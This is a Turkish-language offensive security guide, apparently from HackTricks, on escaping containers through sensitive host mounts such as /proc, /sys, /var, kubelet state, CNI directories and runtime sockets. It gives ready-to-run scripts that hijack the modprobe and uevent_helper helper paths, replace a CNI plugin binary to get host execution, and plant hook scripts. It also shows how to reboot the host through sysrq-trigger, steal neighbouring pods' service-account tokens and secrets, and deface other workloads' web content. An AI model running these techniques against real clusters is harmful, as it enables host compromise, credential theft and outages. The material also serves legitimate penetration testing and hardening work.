# Hassas Host Mount'ları

{{#include ../../../banners/hacktricks-training.md}}

## Genel Bakış

Host mount'ları, dikkatle izole edilmiş bir process görünümünü host kaynaklarının doğrudan görünürlüğüne geri döndürdükleri için en önemli pratik container-escape yüzeylerinden biridir. Tehlikeli durumlar `/` ile sınırlı değildir. `/proc`, `/sys`, `/var`, runtime socket'leri, kubelet tarafından yönetilen state veya device ile ilişkili path'lerin bind mount edilmesi; kernel kontrollerini, credentials bilgilerini, komşu container filesystem'lerini ve runtime yönetim arayüzlerini açığa çıkarabilir.

Bu sayfa, abuse modelinin birden fazla alanı kapsaması nedeniyle ayrı protection sayfalarından bağımsız olarak bulunur. Writable bir host mount; kısmen mount namespace'leri, kısmen user namespace'leri, kısmen AppArmor veya SELinux kapsamı ve kısmen de hangi kesin host path'inin açığa çıkarıldığı nedeniyle tehlikelidir. Bunu ayrı bir konu olarak ele almak attack surface'i anlamayı çok daha kolaylaştırır.

## `/proc` Exposure'ı

procfs hem sıradan process bilgilerini hem de yüksek etkili kernel kontrol arayüzlerini içerir. Bu nedenle `-v /proc:/host/proc` gibi bir bind mount veya beklenmedik writable proc entry'lerini açığa çıkaran bir container görünümü; information disclosure, denial of service veya doğrudan host code execution'a yol açabilir.

Yüksek değerli procfs path'leri şunları içerir:

- `/proc/sys/kernel/core_pattern`
- `/proc/sys/kernel/modprobe`
- `/proc/sys/vm/panic_on_oom`
- `/proc/sys/fs/binfmt_misc`
- `/proc/config.gz`
- `/proc/sysrq-trigger`
- `/proc/kmsg`
- `/proc/kallsyms`
- `/proc/[pid]/mem`
- `/proc/kcore`
- `/proc/kmem`
- `/proc/mem`
- `/proc/sched_debug`
- `/proc/[pid]/mountinfo`

### Abuse

Hangi yüksek değerli procfs entry'lerinin görünür veya writable olduğunu kontrol ederek başlayın:
```bash
for p in \
/proc/sys/kernel/core_pattern \
/proc/sys/kernel/modprobe \
/proc/sysrq-trigger \
/proc/kmsg \
/proc/kallsyms \
/proc/kcore \
/proc/sched_debug \
/proc/1/mountinfo \
/proc/config.gz; do
[ -e "$p" ] && ls -l "$p"
done
```
Bu yollar farklı nedenlerle ilgi çekicidir. `core_pattern`, `modprobe` ve `binfmt_misc`, yazılabilir olduklarında host code-execution yollarına dönüşebilir. `kallsyms`, `kmsg`, `kcore` ve `config.gz`, kernel exploitation için güçlü reconnaissance kaynaklarıdır. `sched_debug` ve `mountinfo`, container içinden host yerleşimini yeniden oluşturmaya yardımcı olabilecek process, cgroup ve filesystem bağlamını açığa çıkarır.

Her yolun pratik değeri farklıdır; hepsine aynı etkiye sahipmiş gibi yaklaşmak triage işlemini zorlaştırır:

- `/proc/sys/kernel/core_pattern`
Yazılabilirse bu, en yüksek etkili procfs yollarından biridir; çünkü kernel bir crash sonrasında pipe handler çalıştırır. `core_pattern` değerini overlay içinde veya mount edilmiş bir host path içindeki payload'a yönlendirebilen bir container, çoğu zaman host code execution elde edebilir. Özel bir örnek için [read-only-paths.md](protections/read-only-paths.md) dosyasına da bakın.
- `/proc/sys/kernel/modprobe`
Bu path, kernel'in module-loading logic'i çağırması gerektiğinde kullandığı userspace helper'ı kontrol eder. Container içinden yazılabilir durumdaysa ve host context içinde yorumlanıyorsa başka bir host code-execution primitive'ine dönüşebilir. Helper path'ini tetikleyebilecek bir yöntemle birleştirildiğinde özellikle ilgi çekicidir.
- `/proc/sys/vm/panic_on_oom`
Bu genellikle temiz bir escape primitive değildir; ancak OOM koşullarını kernel panic davranışına dönüştürerek memory pressure'ı host genelinde denial of service durumuna çevirebilir.
- `/proc/sys/fs/binfmt_misc`
Registration interface yazılabilirse attacker, seçilen bir magic value için handler kaydedebilir ve eşleşen bir file çalıştırıldığında host-context execution elde edebilir.
- `/proc/config.gz`
Kernel exploit triage için kullanışlıdır. Host package metadata'sına ihtiyaç duymadan hangi subsystem'lerin, mitigation'ların ve optional kernel feature'larının etkin olduğunu belirlemeye yardımcı olur.
- `/proc/sysrq-trigger`
Çoğunlukla bir denial-of-service path'idir, ancak çok ciddi bir path'tir. Host'u hemen reboot edebilir, panic'e sokabilir veya başka şekilde kesintiye uğratabilir.
- `/proc/kmsg`
Kernel ring buffer mesajlarını açığa çıkarır. Host fingerprinting, crash analysis ve bazı ortamlarda kernel exploitation için yararlı bilgilerin leak edilmesi açısından kullanışlıdır.
- `/proc/kallsyms`
Okunabilir olduğunda değerlidir; exported kernel symbol bilgilerini açığa çıkarır ve kernel exploit geliştirme sırasında address randomization varsayımlarını aşmaya yardımcı olabilir.
- `/proc/[pid]/mem`
Bu, doğrudan bir process-memory interface'idir. Hedef process gerekli ptrace-style koşullarla erişilebilir durumdaysa başka bir process'in memory'sini okumaya veya değiştirmeye izin verebilir. Gerçek etkisi credentials, `hidepid`, Yama ve ptrace restrictions'a büyük ölçüde bağlıdır; bu nedenle güçlü ancak koşullu bir path'tir.
- `/proc/kcore`
System memory'nin core-image-style görünümünü açığa çıkarır. File çok büyük ve kullanımı zahmetlidir; ancak anlamlı şekilde okunabiliyorsa host memory surface'inin ciddi biçimde açığa çıktığını gösterir.
- `/proc/kmem` ve `/proc/mem`
Tarihsel olarak yüksek etkili raw memory interface'leridir. Modern system'lerin çoğunda devre dışıdır veya ciddi şekilde kısıtlanmıştır; ancak mevcut ve kullanılabilir durumdalarsa critical finding olarak değerlendirilmelidir.
- `/proc/sched_debug`
Scheduling ve task bilgilerini leak eder; diğer process görünümleri beklenenden daha temiz görünse bile host process identity'lerini açığa çıkarabilir.
- `/proc/[pid]/mountinfo`
Container'ın host üzerinde gerçekte nerede bulunduğunu, hangi path'lerin overlay-backed olduğunu ve yazılabilir bir mount'ın host content'ine mi yoksa yalnızca container layer'ına mı karşılık geldiğini yeniden oluşturmak için son derece kullanışlıdır.

`/proc/[pid]/mountinfo` veya overlay ayrıntıları okunabiliyorsa bunları kullanarak container filesystem'ının host path'ini kurtarın:
```bash
cat /proc/self/mountinfo | head -n 50
mount | grep overlay
```
Bu komutlar kullanışlıdır; çünkü çeşitli host-execution teknikleri, container içindeki bir yolun host açısından karşılık gelen yola dönüştürülmesini gerektirir.

### Tam Örnek: `modprobe` Helper Path Abuse

`/proc/sys/kernel/modprobe` container içinden yazılabilir durumdaysa ve helper path host bağlamında yorumlanıyorsa, attacker-controlled bir payload'a yönlendirilebilir:
```bash
[ -w /proc/sys/kernel/modprobe ] || exit 1
host_path=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
cat <<'EOF' > /tmp/modprobe-payload
#!/bin/sh
id > /tmp/modprobe.out
EOF
chmod +x /tmp/modprobe-payload
echo "$host_path/tmp/modprobe-payload" > /proc/sys/kernel/modprobe
cat /proc/sys/kernel/modprobe
```
Tetikleyici tam olarak hedefe ve kernel davranışına bağlıdır, ancak önemli nokta, yazılabilir bir helper path'in gelecekteki bir kernel helper çağrısını saldırgan tarafından kontrol edilen host-path içeriğine yönlendirebilmesidir.

### `kallsyms`, `kmsg` ve `config.gz` ile Full Example: Kernel Recon

Amaç immediate escape yerine exploitability assessment ise:
```bash
head -n 20 /proc/kallsyms 2>/dev/null
dmesg 2>/dev/null | head -n 50
zcat /proc/config.gz 2>/dev/null | egrep 'IKCONFIG|BPF|USER_NS|SECCOMP|KPROBES' | head -n 50
```
Bu komutlar, yararlı sembol bilgilerinin görünür olup olmadığını, son kernel mesajlarının ilginç bir durum ortaya çıkarıp çıkarmadığını ve hangi kernel özellikleri veya mitigation'ların derlenmiş olduğunu anlamaya yardımcı olur. Etkisi genellikle doğrudan escape değildir, ancak kernel vulnerability triage sürecini önemli ölçüde kısaltabilir.

### Tam Örnek: SysRq Host Reboot

`/proc/sysrq-trigger` yazılabilir durumdaysa ve host görünümüne ulaşıyorsa:
```bash
echo b > /proc/sysrq-trigger
```
Etki, host'un derhal yeniden başlatılmasıdır. Bu ince bir örnek değildir, ancak procfs exposure'ın information disclosure'dan çok daha ciddi olabileceğini açıkça gösterir.

## `/sys` Exposure

sysfs, büyük miktarda kernel ve cihaz durumu bilgisi sunar. Bazı sysfs path'leri temel olarak fingerprinting için kullanışlıyken, diğerleri helper execution'ı, cihaz davranışını, security-module yapılandırmasını veya firmware durumunu etkileyebilir.

Yüksek değerli sysfs path'leri şunlardır:

- `/sys/kernel/uevent_helper`
- `/sys/class/thermal`
- `/sys/kernel/vmcoreinfo`
- `/sys/kernel/security`
- `/sys/firmware/efi/vars`
- `/sys/firmware/efi/efivars`
- `/sys/kernel/debug`

Bu path'ler farklı nedenlerle önemlidir. `/sys/class/thermal`, thermal-management davranışını ve dolayısıyla yeterince korunmamış ortamlarda host kararlılığını etkileyebilir. `/sys/kernel/vmcoreinfo`, low-level host fingerprinting için kullanılabilecek crash-dump ve kernel-layout bilgilerini leak edebilir. `/sys/kernel/security`, Linux Security Modules tarafından kullanılan `securityfs` arayüzüdür; bu nedenle buraya beklenmeyen erişim, MAC ile ilgili durumu açığa çıkarabilir veya değiştirebilir. EFI variable path'leri, firmware destekli boot ayarlarını etkileyebilir ve bu da onları sıradan configuration file'larından çok daha ciddi hâle getirir. `/sys/kernel/debug` altındaki `debugfs` özellikle tehlikelidir, çünkü güvenliği güçlendirilmiş production-facing kernel API'lerine kıyasla çok daha az güvenlik beklentisi olan, geliştirici odaklı bir arayüz olarak tasarlanmıştır.

Bu path'ler için kullanışlı review komutları şunlardır:
```bash
find /sys/kernel/security -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/kernel/debug -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/firmware/efi -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/class/thermal -maxdepth 3 -type f 2>/dev/null | head -n 50
cat /sys/kernel/vmcoreinfo 2>/dev/null | head -n 20
```
Bu komutları ilginç kılan şeyler:

- `/sys/kernel/security`, AppArmor, SELinux veya başka bir LSM yüzeyinin yalnızca host'a görünür kalması gerekirken görünür olup olmadığını ortaya çıkarabilir.
- `/sys/kernel/debug`, bu gruptaki en endişe verici bulgu olabilir. `debugfs` mount edilmiş ve okunabilir veya yazılabilir durumdaysa, kesin risk etkin debug düğümlerine bağlı olan geniş bir kernel'e dönük yüzey bekleyin.
- EFI variable exposure daha az yaygındır; ancak normal runtime dosyaları yerine firmware-backed ayarlara dokunduğu için etkisi yüksektir.
- `/sys/class/thermal`, düzenli bir shell-style escape'ten ziyade host stabilitesi ve donanımla etkileşim açısından önemlidir.
- `/sys/kernel/vmcoreinfo`, esas olarak host fingerprinting ve crash analysis kaynağıdır; düşük seviyeli kernel durumunu anlamak için kullanışlıdır.

### Tam Örnek: `uevent_helper`

`/sys/kernel/uevent_helper` yazılabilir durumdaysa kernel, bir `uevent` tetiklendiğinde saldırgan kontrollü bir helper çalıştırabilir:
```bash
cat <<'EOF' > /evil-helper
#!/bin/sh
id > /output
EOF
chmod +x /evil-helper
host_path=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
echo "$host_path/evil-helper" > /sys/kernel/uevent_helper
echo change > /sys/class/mem/null/uevent
cat /output
```
Bunun çalışmasının nedeni, helper path'in host'un bakış açısından yorumlanmasıdır. Tetiklendiğinde helper, mevcut container'ın içinde değil, host context'inde çalışır.

## `/var` Exposure

Host'un `/var` dizinini bir container'a mount etmek, `/` mount etmek kadar çarpıcı görünmediği için genellikle hafife alınır. Ancak pratikte runtime socket'lerine, container snapshot dizinlerine, kubelet tarafından yönetilen pod volume'larına, projected service-account token'larına ve komşu application filesystem'larına erişmek için yeterli olabilir. Modern node'larda `/var`, çoğu zaman operasyonel açıdan en ilgi çekici container durumunun gerçekte bulunduğu yerdir.

### Kubernetes Example

`hostPath: /var` içeren bir pod, çoğu zaman diğer pod'ların projected token'larını ve overlay snapshot içeriğini okuyabilir:
```bash
find /host-var/ -type f -iname '*.env*' 2>/dev/null
find /host-var/ -type f -iname '*token*' 2>/dev/null | grep kubernetes.io
cat /host-var/lib/kubelet/pods/<pod-id>/volumes/kubernetes.io~projected/<volume>/token 2>/dev/null
```
Bu komutlar, mount'un yalnızca önemsiz uygulama verilerini mi yoksa etkisi yüksek cluster kimlik bilgilerini mi açığa çıkardığını yanıtladıkları için kullanışlıdır. Okunabilir bir service-account token, local code execution'ı hemen Kubernetes API erişimine dönüştürebilir.

Token mevcutsa, yalnızca token keşfiyle yetinmek yerine neler üzerinde erişim sahibi olduğunu doğrulayın:
```bash
TOKEN=$(cat /host-var/lib/kubelet/pods/<pod-id>/volumes/kubernetes.io~projected/<volume>/token 2>/dev/null)
curl -sk -H "Authorization: Bearer $TOKEN" https://kubernetes.default.svc/api
```
Buradaki etki, local node access'ten çok daha büyük olabilir. Geniş RBAC yetkilerine sahip bir token, mount edilmiş bir `/var`'ı cluster genelinde compromise elde etmek için kullanılabilir.

### Docker ve containerd Örneği

Docker host'larında ilgili veriler genellikle `/var/lib/docker` altında bulunurken, containerd-backed Kubernetes node'larında `/var/lib/containerd` veya snapshotter-specific path'ler altında bulunabilir:
```bash
docker info 2>/dev/null | grep -i 'docker root\\|storage driver'
find /host-var/lib -maxdepth 5 -type f -iname '*.env*' 2>/dev/null | head -n 50
find /host-var/lib -maxdepth 8 -type f -iname 'index.html' 2>/dev/null | head -n 50
```
Bağlanan `/var`, başka bir workload'un yazılabilir snapshot içeriğini açığa çıkarıyorsa saldırgan, mevcut container yapılandırmasına dokunmadan uygulama dosyalarını değiştirebilir, web içeriği yerleştirebilir veya başlangıç betiklerini değiştirebilir.

Yazılabilir snapshot içeriği bulunduğunda somut kötüye kullanım fikirleri:
```bash
echo '<html><body>pwned</body></html>' > /host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/<id>/fs/usr/share/nginx/html/index2.html 2>/dev/null
grep -Rni 'JWT_SECRET\\|TOKEN\\|PASSWORD' /host-var/lib 2>/dev/null | head -n 50
find /host-var/lib -type f -path '*/.ssh/*' -o -path '*/authorized_keys' 2>/dev/null | head -n 20
```
Bu komutlar kullanışlıdır; çünkü mount edilmiş `/var` için üç ana etki ailesini gösterir: uygulama kurcalama, secret kurtarma ve komşu workload'lara lateral movement.

## Kubelet State, Plugins ve CNI Paths

`/var/lib/kubelet`, `/opt/cni/bin` veya `/etc/cni/net.d` mount edilmesi genellikle privileged DaemonSets, CNI agents, CSI node plugins, GPU operators ve storage helpers aracılığıyla açığa çıkar. Bu mount'ları "node plumbing" olarak göz ardı etmek kolaydır; ancak bunlar doğrudan yeni pod'ların execution path'inde yer alır ve çoğu zaman kubelet credentials, projected secrets, registration sockets ve host tarafında çalışan executable plugin binaries içerir.

Yüksek değerli hedefler şunlardır:

- `/var/lib/kubelet/pki`
- `/var/lib/kubelet/pods`
- `/var/lib/kubelet/device-plugins/kubelet.sock`
- `/var/lib/kubelet/pod-resources/kubelet.sock`
- `/var/lib/kubelet/plugins`
- `/var/lib/kubelet/plugins_registry`
- `/opt/cni/bin`
- `/etc/cni/net.d`

Kullanışlı inceleme komutları şunlardır:
```bash
find /host-var/lib/kubelet -maxdepth 3 \( -type f -o -type s \) 2>/dev/null | \
egrep 'pki|pods/.*/token|device-plugins|pod-resources|plugins(_registry)?' | head -n 100
ls -ld /host/opt/cni/bin /host/etc/cni/net.d 2>/dev/null
find /host/opt/cni/bin -maxdepth 1 -type f -perm /111 2>/dev/null
grep -RniE 'type|ipam|delegate' /host/etc/cni/net.d 2>/dev/null | head -n 50
```
Bu yollar neden önemlidir:

- `/var/lib/kubelet/pki`, kubelet client certificates ve diğer node-local credentials bilgilerini açığa çıkarabilir; bunlar, cluster tasarımına bağlı olarak API server'a veya kubelet-facing TLS endpoints'e karşı yeniden kullanılabilir.
- `/var/lib/kubelet/pods`, genellikle aynı node üzerindeki komşu pod'lara ait projected service-account tokens ve mounted Secrets içerir.
- `/var/lib/kubelet/pod-resources/kubelet.sock` esas olarak bir reconnaissance surface'tir, ancak çok kullanışlıdır: hangi pod ve container'ların şu anda GPU'lara, hugepages'lere, SR-IOV devices'lara ve diğer kıt node-local resources'lara sahip olduğunu ortaya çıkarır.
- `/var/lib/kubelet/device-plugins`, `/var/lib/kubelet/plugins` ve `/var/lib/kubelet/plugins_registry`, hangi CSI, DRA ve device plugins'larının kurulu olduğunu ve kubelet'in hangi socket'lerle iletişim kurmasının beklendiğini ortaya çıkarır. Bu dizinler yalnızca okunabilir değil de writable ise bulgu çok daha ciddi hale gelir.
- `/opt/cni/bin` ve `/etc/cni/net.d`, pod-network setup path'inin doğrudan üzerindedir. Buraya writable erişim, yalnızca configuration exposure olmak yerine çoğu zaman gecikmeli bir host-execution primitive'dir.

### Full Example: Writable `/opt/cni/bin`

Bir host CNI binary directory read-write olarak mount edilmişse, bir plugin'i değiştirmek, kubelet o node üzerinde bir pod sandbox oluşturduğunda host execution elde etmek için yeterli olabilir:
```bash
plugin=$(find /host/opt/cni/bin -maxdepth 1 -type f -perm /111 | \
grep -E '/(bridge|loopback|portmap|calico|flannel|cilium-cni)$' | head -n1)
[ -n "$plugin" ] || exit 1
mv "$plugin" "${plugin}.orig"
cat <<'EOF' > "$plugin"
#!/bin/sh
id > /tmp/cni-triggered
exec "$(dirname "$0")/$(basename "$0").orig" "$@"
EOF
chmod +x "$plugin"
echo "wait for the next pod scheduled on this node"
```
Bu, bağlanmış bir `docker.sock` kadar anlık değildir, ancak güvenliği ihlal edilmiş Kubernetes altyapı pod'larında genellikle daha gerçekçidir. Önemli nokta, değiştirilmiş binary'nin mevcut container tarafından değil, daha sonra host network setup akışı tarafından çalıştırılmasıdır.


## Runtime Socket'leri

Hassas host mount'ları genellikle tam dizinler yerine runtime socket'lerini içerir. Bunlar o kadar önemlidir ki burada ayrıca tekrar vurgulanmayı hak eder:
```text
/run/containerd/containerd.sock
/var/run/crio/crio.sock
/run/podman/podman.sock
/run/buildkit/buildkitd.sock
/var/run/kubelet.sock
/run/firecracker-containerd.sock
```
Bu socket'lerden biri mount edildikten sonraki tam exploitation akışları için [runtime-api-and-daemon-exposure.md](runtime-api-and-daemon-exposure.md) dosyasına bakın.

Hızlı bir ilk interaction pattern olarak:
```bash
docker -H unix:///host/run/docker.sock version 2>/dev/null
ctr --address /host/run/containerd/containerd.sock images ls 2>/dev/null
crictl --runtime-endpoint unix:///host/var/run/crio/crio.sock ps 2>/dev/null
```
If bunlardan biri başarılı olursa, "mounted socket" ile "daha ayrıcalıklı bir sibling container başlatma" arasındaki yol genellikle herhangi bir kernel breakout yolundan çok daha kısadır.

## Writable Host Path Task Hijack

Writable host mount, tehlikeli olmak için `/` dizinini açığa çıkarmak zorunda değildir. Mount edilen path; script'ler, config dosyaları, hook'lar, plugin'ler veya host tarafındaki zamanlanmış bir task ya da service tarafından daha sonra tüketilen dosyaları içeriyorsa container, host'un çalıştırdığı şeyi değiştirebilir.

Generic review flow:
```bash
mount | grep -E ' /host|/mnt|/shared|/opt|/var '
find /host /mnt /shared -maxdepth 4 -type f -writable 2>/dev/null | head -n 50
grep -RniE 'cron|systemd|ExecStart|sh |bash |python|backup|hook|plugin' /host /mnt /shared 2>/dev/null | head -n 50
```
Writable bir dosya host process tarafından tüketiliyorsa, test sırasında payload'u basit ve gözlemlenebilir tutun:
```bash
printf '#!/bin/sh\nid >/tmp/host-task-check\n' > /host/path/to/hook.sh
chmod +x /host/path/to/hook.sh
```
İlginç olan kısım trust boundary'dir: write işlemi container içinden gerçekleşir, ancak execution daha sonra host service context içinde gerçekleşir. Bu durum, dar kapsamlı bir hostPath veya bind mount'u gecikmeli bir host-code-execution primitive'ine dönüştürür.

## Mount ile İlgili CVE'ler

Host mount'ları runtime vulnerabilities ile de kesişir. Önemli güncel örnekler şunlardır:

- `CVE-2024-21626` in `runc`: leaked directory file descriptor, working directory'yi host filesystem üzerinde konumlandırabiliyordu.
- BuildKit'teki `CVE-2024-23651`, `CVE-2024-23652` ve `CVE-2024-23653`: malicious Dockerfile'lar, frontend'ler ve `RUN --mount` flow'ları, build'ler sırasında host file access'i, deletion'ı veya elevated privileges'ı yeniden mümkün kılabiliyordu.
- Buildah ve Podman build flow'larındaki `CVE-2024-1753`: crafted bind mount'lar, build sırasında `/` yolunu read-write olarak expose edebiliyordu.
- `containerd` 2.1.0'daki `CVE-2025-47290`: image unpack sırasında gerçekleşen bir TOCTOU, specially crafted bir image'ın pull sırasında host filesystem'i değiştirmesine izin verebiliyordu.

Bu CVE'ler burada önemlidir, çünkü mount handling'in yalnızca operator configuration ile ilgili olmadığını gösterir. Runtime'ın kendisi de mount-driven escape conditions oluşturabilir.

## Kontroller

En yüksek değerli mount exposure'larını hızlıca bulmak için şu komutları kullanın:
```bash
mount
find / -maxdepth 3 \( -path '/host*' -o -path '/mnt*' -o -path '/rootfs*' \) -type d 2>/dev/null | head -n 100
find / -maxdepth 4 \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
find /host-var/lib/kubelet -maxdepth 3 \( -type f -o -type s \) 2>/dev/null | egrep 'pki|token|device-plugins|pod-resources|plugins(_registry)?' | head -n 100
ls -ld /host/opt/cni/bin /host/etc/cni/net.d 2>/dev/null
find /proc/sys -maxdepth 3 -writable 2>/dev/null | head -n 50
find /sys -maxdepth 4 -writable 2>/dev/null | head -n 50
```
Burada ilginç olanlar:

- Host root, `/proc`, `/sys`, `/var` ve runtime sockets yüksek öncelikli bulguların tümüdür.
- Yazılabilir proc/sys girdileri genellikle mount'un güvenli bir container görünümü yerine host-geneli kernel kontrollerini açığa çıkardığı anlamına gelir.
- Mount edilmiş `/var` yolları yalnızca dosya sistemi incelemesi değil, credential ve komşu workload incelemesi de gerektirir.
- Kubelet state dizinleri ve CNI/plugin yolları, runtime sockets ile aynı önceliğe sahiptir; çünkü bunlar genellikle node'un pod oluşturma ve credential dağıtma yolunun doğrudan üzerinde bulunur.

## Referanslar

- [Local Files And Paths Used By The Kubelet](https://kubernetes.io/docs/reference/node/kubelet-files/)
- [cilium-agent container can access the host via `hostPath` mount](https://github.com/cilium/cilium/security/advisories/GHSA-4hc4-pgfx-3mrx)
{{#include ../../../banners/hacktricks-training.md}}
